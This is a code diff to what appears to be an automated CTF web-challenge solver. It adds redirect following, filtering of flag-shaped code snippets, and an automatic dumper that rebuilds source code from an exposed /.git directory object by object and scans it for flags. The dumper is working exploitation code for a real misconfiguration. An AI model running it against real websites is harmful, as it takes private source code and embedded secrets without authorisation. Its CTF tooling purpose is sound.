@@ -25,10 +25,10 @@ import threading
 import time
 import uuid
 from urllib.error import HTTPError, URLError
-from urllib.parse import parse_qsl, quote, unquote, urlencode, urlsplit, urlunsplit
+from urllib.parse import parse_qsl, quote, unquote, urlencode, urljoin, urlsplit, urlunsplit
 from urllib.request import HTTPRedirectHandler, HTTPSHandler, Request, build_opener
 
-from .common import REPORTS_DIR, scan_flags_text
+from .common import REPORTS_DIR, scan_flags_text, looks_like_code_flag
 
 MAX_BODY = 256 * 1024
 MIN_INTERVAL = 0.5
@@ -119,7 +119,7 @@ def _same_origin(base, target):
 
 
 def fetch(url, base, budget, timeout=8.0, referer=None):
-    """单次 GET。返回 dict；出错写 error 字段而不是抛异常。"""
+    """单次 GET，同源 3xx 最多跟随 3 跳。返回 dict；出错写 error 字段而不是抛异常。"""
     if not _same_origin(base, url):
         raise ValueError("跨源请求被拒绝：" + url)
     budget.take()
@@ -129,25 +129,58 @@ def fetch(url, base, budget, timeout=8.0, referer=None):
     if referer:
         req.add_header("Referer", referer)
     started = time.time()
-    try:
-        with _OPENER.open(req, timeout=timeout) as resp:
-            raw = resp.read(MAX_BODY)
-            return {
-                "url": url, "status": resp.status, "headers": dict(resp.headers.items()),
+    redirects = []
+    cur = url
+    for _hop in range(4):
+        try:
+            with _OPENER.open(req, timeout=timeout) as resp:
+                raw = resp.read(MAX_BODY)
+                res = {
+                    "url": cur, "status": resp.status, "headers": dict(resp.headers.items()),
+                    "body": raw, "error": "", "elapsed": round(time.time() - started, 3),
+                }
+                if redirects:
+                    res["redirects"] = redirects
+                return res
+        except HTTPError as exc:
+            hdrs = dict(exc.headers.items()) if exc.headers else {}
+            loc = hdrs.get("Location") or hdrs.get("location")
+            # 同源 3xx：跟随（保留查询串由服务端 Location 决定），跨源一律不跟
+            if exc.code in (301, 302, 303, 307, 308) and loc and _hop < 3:
+                nxt = urljoin(cur, loc)
+                if _same_origin(base, nxt):
+                    redirects.append({"from": cur, "status": exc.code, "to": nxt})
+                    try:
+                        exc.read()
+                    except Exception:
+                        pass
+                    cur = nxt
+                    req = Request(cur, method="GET")
+                    req.add_header("User-Agent", UA)
+                    req.add_header("Accept", "text/html,application/json,text/plain,*/*")
+                    if referer:
+                        req.add_header("Referer", referer)
+                    budget.take()
+                    continue
+            try:
+                raw = exc.read(MAX_BODY)
+            except Exception:
+                raw = b""
+            res = {
+                "url": cur, "status": exc.code, "headers": hdrs,
                 "body": raw, "error": "", "elapsed": round(time.time() - started, 3),
             }
-    except HTTPError as exc:
-        try:
-            raw = exc.read(MAX_BODY)
-        except Exception:
-            raw = b""
-        return {
-            "url": url, "status": exc.code, "headers": dict(exc.headers.items()) if exc.headers else {},
-            "body": raw, "error": "", "elapsed": round(time.time() - started, 3),
-        }
-    except (URLError, OSError, ssl.SSLError, ValueError) as exc:
-        return {"url": url, "status": 0, "headers": {}, "body": b"",
-                "error": "%s: %s" % (type(exc).__name__, exc), "elapsed": round(time.time() - started, 3)}
+            if redirects:
+                res["redirects"] = redirects
+            return res
+        except (URLError, OSError, ssl.SSLError, ValueError) as exc:
+            res = {"url": cur, "status": 0, "headers": {}, "body": b"",
+                    "error": "%s: %s" % (type(exc).__name__, exc),
+                    "elapsed": round(time.time() - started, 3)}
+            if redirects:
+                res["redirects"] = redirects
+            return res
+    return {"url": cur, "status": 0, "headers": {}, "body": b"", "error": "重定向过多"}
 
 
 def text_of(item):
@@ -180,6 +213,10 @@ def collect_flags(text):
     uniq = []
     for h in hits:
         h = str(h).strip()
+        # 压缩 JS/CSS 里 try{a=b} / flag{Wt=null} 这类代码片段形状和 flag 一样，
+        # 让它们混进来会白占提交配额，这里在收集口再筛一遍。
+        if looks_like_code_flag(h):
+            continue
         if 4 <= len(h) <= 200 and h not in uniq:
             uniq.append(h)
     return uniq
@@ -510,6 +547,92 @@ def build_hints(finding_list, param_results, flaglist):
     return hints
 
 
+def _git_dump_source(base, log):
+    """v4.0.4：检测 .git 暴露后，逐对象 dump commit/tree/blob 恢复源码并扫 flag。
+
+    此前只提示"可用 git-dumper 拉源码"却不自动执行，导致 Git 泄露类 Web 题漏解。
+    仅只读下载，不执行任何拉到的代码。
+    """
+    import zlib
+    import requests
+    root = base.rstrip("/")
+    s = requests.Session()
+    s.headers.update({"User-Agent": "CTFToolbox-WebAuto"})
+
+    def _get(path, timeout=12):
+        try:
+            return s.get(root + path, timeout=timeout)
+        except Exception:
+            return None
+
+    head = _get("/.git/HEAD")
+    if not head or head.status_code != 200 or b"ref:" not in head.content:
+        return None
+    log("[auto] 检测到 .git 暴露，逐对象 dump 源码 ...")
+    files, flags = [], []
+
+    def _obj(sha):
+        r = _get("/.git/objects/%s/%s" % (sha[:2], sha[2:]))
+        if not r or r.status_code != 200:
+            return None
+        try:
+            return zlib.decompress(r.content)
+        except Exception:
+            return None
+
+    def _walk(sha, prefix="", depth=0):
+        if depth > 6 or len(files) > 400:
+            return
+        raw = _obj(sha)
+        if not raw:
+            return
+        kind = raw.split(b" ", 1)[0].decode("utf-8", "replace")
+        if kind == "commit":
+            text = raw.split(b"\x00", 1)[-1].decode("utf-8", "replace")
+            m = re.search(r"tree ([0-9a-f]{40})", text)
+            if m:
+                _walk(m.group(1), prefix, depth + 1)
+        elif kind == "tree":
+            body = raw.split(b"\x00", 1)[-1]
+            i = 0
+            while i < len(body):
+                try:
+                    j = body.index(b"\x00", i)
+                except ValueError:
+                    break
+                mode, _, name = body[i:j].partition(b" ")
+                csha = body[j + 1:j + 21].hex()
+                nm = name.decode("utf-8", "replace")
+                if nm != ".git":
+                    if mode.decode("utf-8", "replace").startswith("40000"):
+                        _walk(csha, prefix + nm + "/", depth + 1)
+                    else:
+                        blob = _obj(csha)
+                        content = blob.split(b"\x00", 1)[-1] if blob else b""
+                        files.append({"path": prefix + nm, "size": len(content)})
+                        txt = content.decode("utf-8", "replace")
+                        for fl in collect_flags(txt):
+                            if fl not in flags:
+                                flags.append(fl)
+                i = j + 21
+
+    commit = None
+    logs = _get("/.git/logs/HEAD")
+    if logs and logs.status_code == 200:
+        m = re.search(rb"([0-9a-f]{40}) [^ ]+ commit", logs.content)
+        if m:
+            commit = m.group(1).decode()
+    if not commit:
+        ref = head.content.decode("utf-8", "replace").split("ref:")[-1].strip()
+        rf = _get("/.git/" + ref)
+        if rf and rf.status_code == 200:
+            commit = rf.content.decode("utf-8", "replace").strip()
+    if commit:
+        _walk(commit)
+    log("[auto] git dump：恢复 %d 个文件，命中 flag %d 个" % (len(files), len(flags)))
+    return {"commit": commit, "files": files[:200], "flags": flags}
+
+
 def auto_solve(url, log=print, max_requests=160, max_seconds=240, cancel_event=None,
                deadline=None, stop_on_flag=True):
     """主入口。返回 dict（可直接 json 序列化）。"""
@@ -575,6 +698,14 @@ def auto_solve(url, log=print, max_requests=160, max_seconds=240, cancel_event=N
         result["sensitive"].extend(probe_sensitive(root_path, budget, log, baseline))
         for f in result["sensitive"]:
             result["flags"].extend(f.get("flags") or [])
+        # v4.0.4：检测到 .git 暴露 → 自动 dump 源码并扫 flag（Git 泄露类 Web 题）
+        try:
+            git_res = _git_dump_source(root_path, log)
+            if git_res:
+                result["git_dump"] = git_res
+                result["flags"].extend(git_res.get("flags") or [])
+        except Exception as _e:
+            log("[auto] git dump 异常：%s" % _e)
         # flag 优先：敏感路径已拿到 flag 就跳过目录词表与参数弱点，省掉几十次请求
         if result["flags"] and stop_on_flag:
             log("[auto] 已拿到 flag，跳过目录探测与参数弱点（完整模式可传 stop_on_flag=False）")
